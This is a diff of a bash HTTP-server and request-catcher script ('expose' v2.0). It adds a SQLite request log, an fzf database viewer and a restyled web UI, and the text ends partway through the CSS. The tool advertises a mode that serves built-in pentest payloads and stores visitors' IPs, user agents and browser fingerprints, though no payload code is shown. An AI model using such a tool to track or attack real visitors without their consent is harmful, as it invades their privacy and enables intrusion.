@@ -2,7 +2,7 @@
 set -uo pipefail
 
 
-VERSION="1.3"
+VERSION="2.0"
 PORT=9090
 MODE=""
 TARGET=""
@@ -23,6 +23,7 @@ PAYLOAD=""
 COLLECT=0
 DELAY_MS=0
 WEBSOCKET=0
+DB_SUMMARY=0
 _COLLECT_FILE=""
 _CLEANUP_DONE=""
 _TMPFILES=()
@@ -52,11 +53,15 @@ _mktmp() { local f; f=$(mktemp "$1"); _TMPFILES+=("$f"); echo "$f"; }
 
 cleanup() {
   [[ -n "$_CLEANUP_DONE" ]] && return; _CLEANUP_DONE=1
-  echo >&2
-  log "${YLW}Shutting down…${R}"
+  if [[ "${EXPOSE_NO_BANNER:-0}" != "1" ]]; then
+    echo >&2
+    log "${YLW}Shutting down…${R}"
+  fi
   for f in "${_TMPFILES[@]+"${_TMPFILES[@]}"}"; do rm -f "$f" 2>/dev/null; done
-  [[ -n "${LOGFILE:-}" ]] && log "${BLU}Log saved to ${U}${LOGFILE}${R}"
-  log "${GRN}Stopped.${R}"
+  if [[ "${EXPOSE_NO_BANNER:-0}" != "1" ]]; then
+    [[ -n "${LOGFILE:-}" ]] && log "${BLU}Log saved to ${U}${LOGFILE}${R}"
+    log "${GRN}Stopped.${R}"
+  fi
 }
 
 trap 'cleanup; exit 0' INT TERM
@@ -77,6 +82,7 @@ ${B}USAGE${R}
     expose [opts] ${CYN}--payload <name>${R} Serve a built-in pentest payload
     expose [opts] ${CYN}--websocket${R}      WebSocket echo server
     expose ${CYN}--replay <logfile>${R}      Replay the last logged request
+    expose ${CYN}db [database]${R}           Browse the request database
 
 ${B}OPTIONS${R}
     -p, --port ${CYN}<port>${R}     Listen port  (default: ${PORT})
@@ -126,8 +132,11 @@ ${B}EXAMPLES${R}
     expose --cors --code 200 '{"ok":true}'
     expose --delay 500 "slow response"
     expose --replay ./session.json
+    expose db
+    expose db --summary
 EOF
 }
+
 # ── Parse arguments ──────────────────────────────────────────────────────────
 # ── Parse arguments ───────────────────────────────────────────────────────────
 while [[ $# -gt 0 ]]; do
@@ -153,10 +162,20 @@ while [[ $# -gt 0 ]]; do
     --delay)     [[ -n "${2:-}" ]] || die "Missing milliseconds after $1"; DELAY_MS="$2"; shift 2 ;;
     --websocket) WEBSOCKET=1; MODE="websocket"; shift ;;
     --replay)    [[ -n "${2:-}" ]] || die "Missing logfile after $1"; MODE="replay"; TARGET="$2"; shift 2 ;;
+    --summary)   [[ "$MODE" == "db" ]] || die "--summary is only valid with 'expose db'"; DB_SUMMARY=1; shift ;;
+    db)          MODE="db"; TARGET="${HOME}/.expose/requests.db"; shift ;;
     .)           MODE="dir"; shift ;;
     -)           MODE="stdin"; shift ;;
     -*)          die "Unknown option: $1" ;;
-    *)           MODE="text"; TARGET="$1"; shift ;;
+    *)
+      if [[ "$MODE" == "db" && "$TARGET" == "${HOME}/.expose/requests.db" ]]; then
+        TARGET="$1"
+      else
+        MODE="text"
+        TARGET="$1"
+      fi
+      shift
+      ;;
   esac
 done
 
@@ -178,20 +197,29 @@ fi
 
 
 # ── Validate ──────────────────────────────────────────────────────────────────
+if [[ "$MODE" == "db" ]]; then
+  command -v sqlite3 &>/dev/null || die "sqlite3 is required for database browsing"
+  [[ -f "$TARGET" ]] || die "Database not found: $TARGET"
+  if [[ $DB_SUMMARY -eq 0 ]]; then
+    command -v fzf &>/dev/null || die "fzf is required for the database viewer"
+    [[ -t 0 && -t 1 ]] || die "Database viewer requires an interactive terminal (use --summary otherwise)"
+  fi
+else
 [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT >= 1 && PORT <= 65535 )) \
   || die "Invalid port: $PORT (must be 1–65535)"
 [[ "$MODE" == "file" && ! -f "$TARGET" ]] && die "File not found: $TARGET"
-[[ "$MODE" != "dir" ]] && ! command -v socat &>/dev/null \
-  && die "socat is required  (apt install socat)"
-[[ "$MODE" == "dir" ]] && ! command -v python3 &>/dev/null \
-  && die "python3 is required for directory serving"
+command -v python3 &>/dev/null || die "python3 is required"
 [[ -n "$RESP_CODE" ]] && { [[ "$RESP_CODE" =~ ^[0-9]+$ ]] && (( RESP_CODE >= 100 && RESP_CODE <= 599 )) \
   || die "Invalid status code: $RESP_CODE (must be 100–599)"; }
 [[ -n "$AUTH" && "$AUTH" != *:* ]] && die "Invalid auth format: use user:pass"
 [[ "$BODY_LIMIT" =~ ^[0-9]+$ ]] || die "Invalid --body-limit: must be a non-negative integer"
-[[ $CATCH -eq 1 && "$MODE" == "dir" ]] && die "--catch is not supported with directory mode"
-[[ $ONCE -eq 1 && "$MODE" == "dir" ]] && die "--once is not supported with directory mode"
-[[ $TLS -eq 1 && "$MODE" == "dir" ]] && die "--tls is not yet supported with directory mode"
+if (( ${#RESP_HEADERS[@]} )); then
+  for _header in "${RESP_HEADERS[@]}"; do
+    [[ "$_header" == *:* ]] || die "Invalid response header: use 'Name: value'"
+    [[ "$_header" != *$'\r'* && "$_header" != *$'\n'* ]] \
+      || die "Invalid response header: line breaks are not allowed"
+  done
+fi
 [[ -n "$LOGFILE" ]] && { _ldir=$(dirname "$LOGFILE"); [[ -w "$_ldir" ]] || die "Cannot write log to: $LOGFILE"; }
 [[ -n "$BIND" && ! "$BIND" =~ ^[0-9a-fA-F.:]+$ ]] && die "Invalid bind address: $BIND"
 
@@ -213,14 +241,19 @@ if (( ${#ALLOWED_NETS[@]} )); then
 fi
 
 # ── Check port in use ────────────────────────────────────────────────────────
-_port_pid=$(ss -tlnp "sport = :$PORT" 2>/dev/null \
-  | awk 'NR>1{match($0,/pid=([0-9]+)/,a); if(a[1]) print a[1]}' | head -1)
+_port_pid=""
+if [[ "$MODE" != "replay" ]]; then
+  _port_pid=$(ss -tlnp "sport = :$PORT" 2>/dev/null \
+    | awk 'NR>1{match($0,/pid=([0-9]+)/,a); if(a[1]) print a[1]}' | head -1)
+fi
 if [[ -n "$_port_pid" ]]; then
   _port_cmd=$(ps -p "$_port_pid" -o comm= 2>/dev/null || echo "unknown")
   printf "%s%sPort %s is already in use%s by %s%s%s (pid %s)\n" \
     "$B" "$YLW" "$PORT" "$R" "$B" "$_port_cmd" "$R" "$_port_pid" >&2
   printf "Kill it? [y/N] " >&2
-  read -r _ans </dev/tty
+  _ans=""
+  read -r _ans </dev/tty 2>/dev/null \
+    || die "Port $PORT is in use — pick another with -p"
   if [[ "$_ans" =~ ^[Yy]$ ]]; then
     kill "$_port_pid" 2>/dev/null
     # wait briefly for port to free
@@ -233,7 +266,130 @@ if [[ -n "$_port_pid" ]]; then
     die "Port $PORT is in use — pick another with -p"
   fi
 fi
+fi
 
+# ── Database viewer ───────────────────────────────────────────────────────────
+database_summary() {
+  local db="$1"
+  sqlite3 -readonly -header -box "$db" "
+    select 'requests' as table_name, count(*) as rows from requests
+    union all
+    select 'fingerprints', count(*) from fingerprints;
+  "
+}
+
+database_tables() {
+  local db="$1"
+  sqlite3 -readonly -separator $'\t' "$db" "
+    select name,
+           case name
+             when 'requests' then (select count(*) from requests)
+             when 'fingerprints' then (select count(*) from fingerprints)
+             else 0
+           end,
+           case name
+             when 'requests' then 'HTTP request history'
+             when 'fingerprints' then 'Browser fingerprint reports'
+             else 'SQLite table'
+           end
+    from sqlite_master
+    where type = 'table' and name not like 'sqlite_%'
+    order by name;
+  "
+}
+
+database_rows() {
+  local db="$1" table="$2"
+  case "$table" in
+    requests)
+      sqlite3 -readonly -separator $'\t' "$db" "
+        select id, time, method, path, ip, mode
+        from requests order by id desc;
+      "
+      ;;
+    fingerprints)
+      sqlite3 -readonly -separator $'\t' "$db" "
+        select id, time, visitor_id, ip, page
+        from fingerprints order by id desc;
+      "
+      ;;
+  esac
+}
+
+database_view() {
+  local db="$1" table selection row_id
+  export EXPOSE_VIEW_DB="$db"
+
+  if [[ $DB_SUMMARY -eq 1 ]]; then
+    database_summary "$db"
+    return
+  fi
+
+  while true; do
+    selection=$(database_tables "$db" | fzf \
+      --delimiter=$'\t' \
+      --with-nth=1,2,3 \
+      --header='TABLE                         ROWS  DESCRIPTION' \
+      --header-lines=0 \
+      --prompt='database › ' \
+      --pointer='›' \
+      --layout=reverse \
+      --height=100% \
+      --border=rounded \
+      --info=inline \
+      --no-multi) || break
+
+    table="${selection%%$'\t'*}"
+    case "$table" in
+      requests)
+        selection=$(database_rows "$db" "$table" | fzf \
+          --delimiter=$'\t' \
+          --with-nth=1,2,3,4,5,6 \
+          --header='ID  TIME      METHOD  PATH  IP  MODE' \
+          --prompt='requests › ' \
+          --pointer='›' \
+          --layout=reverse \
+          --height=100% \
+          --border=rounded \
+          --info=inline \
+          --no-multi \
+          --preview-window='right,55%,wrap' \
+          --preview='sqlite3 -readonly -header -box "$EXPOSE_VIEW_DB" "select * from requests where id={1};"') || continue
+        ;;
+      fingerprints)
+        selection=$(database_rows "$db" "$table" | fzf \
+          --delimiter=$'\t' \
+          --with-nth=1,2,3,4,5 \
+          --header='ID  TIME      VISITOR  IP  PAGE' \
+          --prompt='fingerprints › ' \
+          --pointer='›' \
+          --layout=reverse \
+          --height=100% \
+          --border=rounded \
+          --info=inline \
+          --no-multi \
+          --preview-window='right,60%,wrap' \
+          --preview='sqlite3 -readonly -header -box "$EXPOSE_VIEW_DB" "select * from fingerprints where id={1};"') || continue
+        ;;
+      *)
+        continue
+        ;;
+    esac
+
+    row_id="${selection%%$'\t'*}"
+    [[ "$row_id" =~ ^[0-9]+$ ]] || continue
+    clear
+    sqlite3 -readonly -header -box "$db" "select * from \"$table\" where id=$row_id;"
+    printf '\nPress any key to return…'
+    read -rsn1
+  done
+}
+
+if [[ "$MODE" == "db" ]]; then
+  EXPOSE_NO_BANNER=1
+  database_view "$TARGET"
+  exit
+fi
 
 # ── Banner ────────────────────────────────────────────────────────────────────
 LOCAL_IP=$(get_local_ip)
@@ -255,10 +411,19 @@ mode_label() {
       echo "${B}file${R}  ${CYN}$(realpath "$TARGET")${R}  ${D}(${mime}, ${sz} bytes)${R}" ;;
     dir)
       echo "${B}directory${R}  ${CYN}$(pwd)${R}" ;;
+    redirect)
+      echo "${B}redirect${R}  ${D}(${REDIRECT})${R}" ;;
+    payload)
+      echo "${B}payload${R}  ${CYN}${PAYLOAD}${R}" ;;
+    websocket)
+      echo "${B}websocket${R} echo server" ;;
+    replay)
+      echo "${B}replay${R}  ${CYN}${TARGET}${R}" ;;
   esac
 }
 
-cat >&2 <<EOF
+if [[ "${EXPOSE_NO_BANNER:-0}" != "1" ]]; then
+  cat >&2 <<EOF
 
   ${B}${GRN}▲ expose${R}  ${D}v${VERSION}${R}
   ${D}──────────────────────────────────────────${R}
@@ -289,14 +454,13 @@ cat >&2 <<EOF
 
 EOF
 
-log "${GRN}Waiting for connections…${R}"
-echo >&2
+  log "${GRN}Waiting for connections…${R}"
+  echo >&2
+fi
 
 # ── Request counter ───────────────────────────────────────────────────────────
 
 # ── Serve ────────────────────────────────────────────────────────────────────
-_COUNTERFILE=$(_mktmp /tmp/expose-counter.XXXXXX)
-echo 0 > "$_COUNTERFILE"
 # ── Request log file ──────────────────────────────────────────────────────────
 if [[ -n "$LOGFILE" ]]; then
   _LOGFILE="$LOGFILE"
@@ -313,7 +477,12 @@ if [[ $COLLECT -eq 1 ]]; then
     _COLLECT_FILE=$(_mktmp /tmp/expose-collect.XXXXXX)
   fi
   : > "$_COLLECT_FILE"
-  trap "echo; echo '${GRN}Collected requests:${R} ${_COLLECT_FILE}'; wc -l < '${_COLLECT_FILE}' | xargs printf '${GRN}Total:${R} %s\n'" EXIT
+  print_collected() {
+    echo
+    printf '%sCollected requests:%s %s\n' "$GRN" "$R" "$_COLLECT_FILE"
+    printf '%sTotal:%s %s\n' "$GRN" "$R" "$(wc -l < "$_COLLECT_FILE")"
+  }
+  trap 'print_collected; cleanup' EXIT
 fi
 
 # ── Chat file ──
@@ -337,480 +506,1158 @@ fi
 UPLOAD_DIR="${HOME}/Downloads/expose"
 mkdir -p "$UPLOAD_DIR"
 
+# ── Persistent SQLite request log (~/.expose/requests.db) ────────────────────
+_DB_DIR="${HOME}/.expose"
+_DB="${_DB_DIR}/requests.db"
+if command -v python3 &>/dev/null && mkdir -p "$_DB_DIR" 2>/dev/null; then
+  python3 - "$_DB" <<'PYDB' 2>/dev/null
+import sqlite3, sys
+con = sqlite3.connect(sys.argv[1])
+con.execute("""create table if not exists requests(
+  id integer primary key autoincrement,
+  ts real, time text, method text, path text,
+  ip text, port text, ua text, host text,
+  content_type text, content_len text, mode text)""")
+con.execute("""create table if not exists fingerprints(
+  id integer primary key autoincrement,
+  ts real, time text,
+  ip text, port text, ua text,
+  page text, visitor_id text, data text)""")
+con.execute("pragma journal_mode=WAL")
+con.commit(); con.close()
+PYDB
+fi
+
 _UPLOAD_HTML=$(_mktmp /tmp/expose-upload-html.XXXXXX)
 cat > "$_UPLOAD_HTML" << 'UPLOADHTML'
 <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>expose / upload</title>
-<style>
+<title>expose</title>
+<script>try{var __t=localStorage.getItem('expose-theme');if(__t&&__t!=='auto')document.documentElement.dataset.theme=__t}catch(_){}</script>
+<style>/* expose — web UI */
 :root{
-  --bg:#edebe7;--fg:#262520;--dim:#84817a;--dim2:#a09d96;--rule:#ccc9c2;
-  --ink:#1d1c18;--accent:#a4421a;--accent-h:#893515;
-  --err:#8b2e22;--ok:#436b3a;
-  --code:ui-monospace,'Cascadia Code','SF Mono',Menlo,Consolas,monospace;
-  --ui:system-ui,-apple-system,'Segoe UI',sans-serif
+  --bg:#0a0c10; --srf:#10141b; --srf2:#151a23; --srf3:#1a212d;
+  --brd:#1f2632; --brd2:#2a3342;
+  --txt:#e8ebf1; --dim:#9aa3b2; --fnt:#646d7c;
+  --acc:#34d399; --acc2:#10b981; --accsoft:rgba(52,211,153,.12);
+  --acc-bd:rgba(52,211,153,.28); --acc-bd2:rgba(52,211,153,.55); --acc-faint:rgba(52,211,153,.05);
+  --on-acc:#06120c;
+  --blu:#60a5fa; --amb:#fbbf24; --red:#f87171; --vio:#a78bfa;
+  --top-bg:rgba(10,12,16,.78); --log-bg:rgba(13,16,22,.92); --ov-bg:rgba(10,12,16,.82);
+  --sel:rgba(52,211,153,.28); --hl:rgba(251,191,36,.3);
+  --g1:rgba(52,211,153,.09); --g2:rgba(96,165,250,.06);
+  --card-bg:linear-gradient(180deg,var(--srf),rgba(16,20,27,.65));
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;
+  --mono:ui-monospace,"SF Mono","Cascadia Code","JetBrains Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --r-card:14px; --r-ctl:9px; --r-chip:6px;
+  --sh:0 1px 2px rgba(0,0,0,.35),0 8px 28px rgba(0,0,0,.28);
+  color-scheme:dark;
 }
-*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-html{font-size:22.5px;-webkit-text-size-adjust:100%}
-body{font-family:var(--ui);background:var(--bg);color:var(--fg);
-  min-height:100vh;display:flex;flex-direction:column;line-height:1.55;
-  -webkit-font-smoothing:antialiased}
+/* light theme — explicit user choice */
+:root[data-theme="light"]{
+  --bg:#f4f6f9; --srf:#ffffff; --srf2:#eef1f5; --srf3:#e4e8ee;
+  --brd:#dfe3ea; --brd2:#c6cdd9;
+  --txt:#182230; --dim:#525f72; --fnt:#8a94a4;
+  --acc:#059669; --acc2:#0b9e6f; --accsoft:rgba(5,150,105,.1);
+  --acc-bd:rgba(5,150,105,.32); --acc-bd2:rgba(5,150,105,.55); --acc-faint:rgba(5,150,105,.05);
+  --on-acc:#ffffff;
+  --blu:#2563eb; --amb:#b45309; --red:#dc2626; --vio:#7c3aed;
+  --top-bg:rgba(255,255,255,.8); --log-bg:rgba(255,255,255,.94); --ov-bg:rgba(244,246,249,.86);
+  --sel:rgba(5,150,105,.22); --hl:rgba(217,119,6,.32);
+  --g1:rgba(5,150,105,.06); --g2:rgba(37,99,235,.045);
+  --card-bg:linear-gradient(180deg,var(--srf),rgba(244,246,249,.55));
+  --sh:0 1px 2px rgba(16,24,40,.05),0 8px 24px rgba(16,24,40,.09);
+  color-scheme:light;
+}
+/* light theme — following the OS when the user hasn't chosen */
+@media (prefers-color-scheme:light){
+  :root:not([data-theme]){
+    --bg:#f4f6f9; --srf:#ffffff; --srf2:#eef1f5; --srf3:#e4e8ee;
+    --brd:#dfe3ea; --brd2:#c6cdd9;
+    --txt:#182230; --dim:#525f72; --fnt:#8a94a4;
+    --acc:#059669; --acc2:#0b9e6f; --accsoft:rgba(5,150,105,.1);
+    --acc-bd:rgba(5,150,105,.32); --acc-bd2:rgba(5,150,105,.55); --acc-faint:rgba(5,150,105,.05);
+    --on-acc:#ffffff;
+    --blu:#2563eb; --amb:#b45309; --red:#dc2626; --vio:#7c3aed;
+    --top-bg:rgba(255,255,255,.8); --log-bg:rgba(255,255,255,.94); --ov-bg:rgba(244,246,249,.86);
+    --sel:rgba(5,150,105,.22); --hl:rgba(217,119,6,.32);
+    --g1:rgba(5,150,105,.06); --g2:rgba(37,99,235,.045);
+  --card-bg:linear-gradient(180deg,var(--srf),rgba(244,246,249,.55));
+    --sh:0 1px 2px rgba(16,24,40,.05),0 8px 24px rgba(16,24,40,.09);
+    color-scheme:light;
+  }
+}
+*{box-sizing:border-box;margin:0;padding:0}
+[hidden]{display:none !important}
+html{scrollbar-color:var(--brd2) transparent}
+body{
+  background:var(--bg); color:var(--txt);
+  font:14px/1.55 var(--sans);
+  -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
+  padding-bottom:64px;
+}
+::selection{background:var(--sel)}
+a{color:var(--acc);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.92em;background:var(--srf3);border:1px solid var(--brd);border-radius:5px;padding:.05em .4em}
+button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
+:focus-visible{outline:2px solid var(--acc);outline-offset:2px;border-radius:4px}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:var(--brd2);border-radius:8px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
 
-.shell{width:100%;max-width:30rem;margin:0 auto;
-  padding:clamp(1.75rem,6vw,3.5rem) clamp(1rem,3vw,1.5rem) 2rem}
+/* icon defaults */
+.btn svg,.iconbtn svg,.ic,.drop-ic,.ov-box svg{
+  width:15px;height:15px;flex:none;fill:none;stroke:currentColor;
+  stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round;
+}
+.logo svg{width:27px;height:23px}
 
-/* ── header ── */
-header{margin-bottom:clamp(1.5rem,4vw,2.5rem);display:flex;align-items:baseline;gap:.625rem}
-header .id{font-family:var(--code);font-size:.75rem;color:var(--dim);letter-spacing:.03em}
-header .id b{font-weight:600;color:var(--fg)}
-header .pipe{color:var(--rule)}
-header .path{font-family:var(--code);font-size:.6875rem;color:var(--dim2);letter-spacing:.01em}
+/* ambient glow */
+.glow{position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:
+    radial-gradient(600px 260px at 22% -60px,var(--g1),transparent 70%),
+    radial-gradient(700px 300px at 85% -80px,var(--g2),transparent 70%);
+}
 
-/* ── drop zone ── */
-.drop{padding:clamp(1.25rem,3vw,2rem) 1rem;border:1px solid var(--rule);
-  background:color-mix(in srgb,var(--bg) 50%,#fff);cursor:pointer;
-  transition:border-color .15s,box-shadow .15s}
-.drop:hover{border-color:var(--dim)}
-.drop.over{border-color:var(--accent);box-shadow:inset 0 0 0 1px var(--accent)}
-.drop p{font-size:.8125rem;color:var(--dim);text-align:center}
-.drop p a{color:var(--accent);text-decoration:underline;text-underline-offset:2px;
-  text-decoration-thickness:1px;cursor:pointer}
-.drop p a:hover{color:var(--accent-h)}
-.drop input{display:none}
+.wrap{max-width:920px;margin:0 auto;padding:0 20px;position:relative;z-index:1}
 
-/* ── queue (staging area) ── */
-.queue{margin-top:1rem}
-.qi{display:flex;align-items:baseline;gap:.5rem;padding:.3rem 0;
-  border-bottom:1px solid color-mix(in srgb,var(--rule) 70%,transparent);
-  animation:fadeUp .25s cubic-bezier(.2,1,.3,1) both;font-size:.8125rem}
-@keyframes fadeUp{from{opacity:0;transform:translateY(3px)}}
-.qi .fn{flex:1;font-family:var(--code);font-size:.75rem;color:var(--ink);
-  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.qi .fs{font-family:var(--code);font-size:.6875rem;color:var(--dim2);white-space:nowrap;
-  min-width:4rem;text-align:right}
-.qi .qr{font-size:.6875rem;color:var(--dim2);cursor:pointer;transition:color .1s;
-  background:none;border:none;font-family:var(--ui);padding:0 2px}
-.qi .qr:hover{color:var(--err)}
-.qn{font-size:.6875rem;color:var(--dim);margin-top:.375rem}
+/* ── header ─────────────────────────────────────────────── */
+.top{position:sticky;top:0;z-index:40;
+  background:var(--top-bg);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--brd);
+}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:56px;gap:12px}
+.brand{display:flex;align-items:center;gap:10px;min-width:0}
+.logo{display:grid;place-items:center;width:34px;height:34px;color:var(--txt);
+  background:linear-gradient(145deg,var(--accsoft),rgba(52,211,153,.03));
+  border:1px solid var(--acc-bd);border-radius:9px;
+  box-shadow:0 0 18px rgba(52,211,153,.14) inset,0 0 14px rgba(52,211,153,.08);
+}
+.word{font-weight:650;font-size:15.5px;letter-spacing:-.01em}
+.badge{font:600 11px/1 var(--mono);letter-spacing:.06em;text-transform:uppercase;
+  color:var(--acc);background:var(--accsoft);border:1px solid var(--acc-bd);
+  padding:5px 8px;border-radius:99px;white-space:nowrap}
+.badge.blu{color:var(--blu);background:rgba(96,165,250,.1);border-color:rgba(96,165,250,.28)}
+.badge.vio{color:var(--vio);background:rgba(167,139,250,.1);border-color:rgba(167,139,250,.28)}
+.badge.amb{color:var(--amb);background:rgba(251,191,36,.1);border-color:rgba(251,191,36,.28)}
+.top-acts{display:flex;align-items:center;gap:8px}
 
-/* ── actions ── */
-.acts{margin-top:.875rem;display:none;align-items:center;gap:.75rem}
-.abtn{font-family:var(--ui);font-size:.8125rem;font-weight:600;letter-spacing:.01em;
-  background:var(--ink);color:var(--bg);border:none;padding:.4rem 1rem;cursor:pointer;
-  transition:background .12s}
-.abtn:hover{background:var(--accent)}
-.abtn:disabled{background:var(--rule);color:var(--dim);cursor:default}
-.aclr{font-size:.75rem;color:var(--dim);cursor:pointer;background:none;border:none;
-  font-family:var(--ui);text-decoration:underline;text-underline-offset:2px;
-  text-decoration-color:var(--rule)}
-.aclr:hover{color:var(--fg);text-decoration-color:var(--fg)}
+/* ── buttons ────────────────────────────────────────────── */
+.btn{display:inline-flex;align-items:center;gap:7px;
+  font-weight:550;font-size:13px;line-height:1;white-space:nowrap;
+  padding:9px 14px;border-radius:var(--r-ctl);border:1px solid transparent;
+  transition:background .15s,border-color .15s,color .15s,transform .05s;
+}
+.btn:active{transform:translateY(1px)}
+.btn.sm{padding:7px 11px;font-size:12.5px}
+.btn.primary{background:var(--acc2);color:var(--on-acc);border-color:rgba(255,255,255,.08)}
+.btn.primary:hover{background:var(--acc)}
+.btn.primary:disabled{opacity:.45;cursor:not-allowed}
+.btn.ghost{background:var(--srf2);border-color:var(--brd);color:var(--dim)}
+.btn.ghost:hover{color:var(--txt);border-color:var(--brd2);background:var(--srf3)}
+.iconbtn{display:grid;place-items:center;width:28px;height:28px;border-radius:7px;color:var(--fnt);
+  transition:color .15s,background .15s}
+.iconbtn:hover{color:var(--txt);background:var(--srf3)}
+.iconbtn.dgr:hover{color:var(--red);background:rgba(248,113,113,.1)}
+.linklike{color:var(--acc);font:inherit;text-decoration:underline;text-underline-offset:3px;text-decoration-color:var(--acc-bd)}
+.linklike:hover{text-decoration-color:var(--acc)}
+.dot{position:absolute;top:4px;right:4px;width:7px;height:7px;border-radius:99px;background:var(--acc);
+  box-shadow:0 0 6px var(--acc)}
+#chat-toggle{position:relative}
+#chat-toggle.active{color:var(--acc);border-color:var(--acc-bd)}
 
-/* ── progress + msg ── */
-.prog{height:1px;background:var(--rule);margin-top:.875rem;display:none;overflow:hidden}
-.prog i{display:block;height:100%;width:0;background:var(--accent);
-  transition:width .3s cubic-bezier(.2,1,.3,1)}
-.msg{font-size:.75rem;margin-top:.5rem;opacity:0;transition:opacity .25s}
-.msg.vis{opacity:1}.msg.ok{color:var(--ok)}.msg.err{color:var(--err)}
+/* ── cards ──────────────────────────────────────────────── */
+main.wrap{display:flex;flex-direction:column;gap:16px;padding-top:40px}
+.card{background:var(--card-bg);
+  border:1px solid var(--brd);border-radius:var(--r-card);box-shadow:var(--sh);
+  padding:18px;animation:fadeUp .35s ease both}
+.card-h{display:flex;align-items:baseline;gap:10px;margin-bottom:14px}
+.card-h h2{font-size:13px;font-weight:650;letter-spacing:.02em}
+.hint{font-size:12px;color:var(--fnt)}
+@keyframes fadeUp{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}
 
-/* ── divider ── */
-.div{margin-top:clamp(1.5rem,4vw,2.25rem);padding-top:.625rem;display:none;
-  border-top:1px solid var(--rule)}
-.div span{font-size:.6875rem;color:var(--dim);text-transform:uppercase;letter-spacing:.06em}
+/* ── hero (mode-aware) ──────────────────────────────────── */
+.hero-lbl{font:600 11px/1 var(--mono);letter-spacing:.09em;text-transform:uppercase;color:var(--fnt);margin-bottom:12px}
+.hero-text{background:var(--bg);border:1px solid var(--brd);border-radius:10px;
+  padding:14px 16px;font:13px/1.6 var(--mono);color:var(--txt);
+  white-space:pre-wrap;word-break:break-word;max-height:320px;overflow:auto;margin-bottom:12px}
+.hero-acts{display:flex;gap:8px;flex-wrap:wrap}
+.hero-file{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.hero-file .fic{display:grid;place-items:center;width:46px;height:46px;flex:none;
+  color:var(--acc);background:var(--accsoft);border:1px solid var(--acc-bd);border-radius:11px}
+.hero-file .fic svg{width:21px;height:21px}
+.hero-file .fnm{font:600 14.5px/1.3 var(--mono);word-break:break-all}
+.hero-file .fmeta{font-size:12.5px;color:var(--fnt);margin-top:2px}
+.hero-file .sp{flex:1}
+.hero-catch{text-align:center;padding:26px 10px 20px}
+.hero-catch .radar{display:inline-grid;place-items:center;width:52px;height:52px;color:var(--acc);
+  background:var(--accsoft);border:1px solid var(--acc-bd);border-radius:99px;margin-bottom:14px;
+  animation:radar 2.2s ease-out infinite}
+.hero-catch .radar svg{width:24px;height:24px}
+@keyframes radar{0%{box-shadow:0 0 0 0 var(--acc-bd)}70%{box-shadow:0 0 0 16px rgba(52,211,153,0)}100%{box-shadow:0 0 0 0 rgba(52,211,153,0)}}
+.hero-catch h3{font-size:16px;font-weight:650;margin-bottom:6px}
+.hero-catch p{color:var(--dim);font-size:13px;max-width:46ch;margin:0 auto 14px}
+.curl-chip{display:inline-flex;align-items:center;gap:10px;background:var(--bg);
+  border:1px solid var(--brd);border-radius:9px;padding:9px 12px;font:12.5px var(--mono);color:var(--dim)}
 
-/* ── saved (on-disk) files ── */
-.disk{margin-top:.375rem}
-.di{display:flex;align-items:baseline;gap:.5rem;padding:.3rem 0;
-  border-bottom:1px solid color-mix(in srgb,var(--rule) 50%,transparent);
-  animation:fadeUp .2s cubic-bezier(.2,1,.3,1) both;font-size:.8125rem}
-.di .fn{flex:1;font-family:var(--code);font-size:.75rem;color:var(--ink);
-  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.di .fs{font-family:var(--code);font-size:.6875rem;color:var(--dim2);white-space:nowrap;
-  min-width:4rem;text-align:right}
-.di .dd,.di .dl{font-size:.6875rem;color:var(--accent);text-decoration:none;
-  transition:color .1s;font-family:var(--ui);cursor:pointer;background:none;border:none;padding:0 2px}
-.di .dd:hover,.di .dl:hover{color:var(--accent-h)}
-.di .dl.copied{color:var(--ok)}
-.di .cpi{font-family:var(--code);font-size:.6875rem;color:var(--fg);background:var(--bg);
-  border:1px solid var(--rule);padding:.1rem .3rem;width:100%;max-width:16rem;
-  outline:none;margin:0 .25rem}
-.di .dx{font-size:.6875rem;color:var(--dim2);cursor:pointer;background:none;border:none;
-  font-family:var(--ui);padding:0 2px;transition:color .1s}
-.di .dx:hover{color:var(--err)}
-.dn{font-size:.6875rem;color:var(--dim);margin-top:.375rem}
-.empty{font-size:.75rem;color:var(--dim2);padding:.5rem 0}
+/* directory browser */
+.dir-host{font:12px var(--mono);color:var(--fnt);margin:-6px 0 12px}
+.crumbs{display:flex;flex-wrap:wrap;gap:2px;font:12.5px var(--mono);margin-bottom:10px}
+.crumbs a{color:var(--dim);padding:2px 5px;border-radius:5px}
+.crumbs a:hover{color:var(--acc);background:var(--srf2);text-decoration:none}
+.crumbs .cur{color:var(--txt)}
+.de{display:grid;grid-template-columns:22px 1fr auto auto;align-items:center;gap:10px;
+  padding:8px 10px;border-radius:8px;animation:fadeUp .3s ease both}
+.de:hover{background:var(--srf2)}
+.de .ic{width:16px;height:16px;color:var(--fnt)}
+.de.is-dir .ic{color:var(--blu)}
+.de .fn{font:13px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.de .fn a{color:var(--txt)}
+.de .fn a:hover{color:var(--acc);text-decoration:none}
+.de .fs,.de .fd{font:11.5px var(--mono);color:var(--fnt);white-space:nowrap}
+.dir-empty{padding:18px;text-align:center;color:var(--fnt);font-size:13px}
 
-/* ── context (mode content) ── */
-.ctx{margin-bottom:1.25rem;display:none}
-.ctx.vis{display:block}
-.ctx-lbl{font-size:.6875rem;color:var(--dim);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.5rem}
-.ctx-text{font-family:var(--code);font-size:.75rem;color:var(--ink);
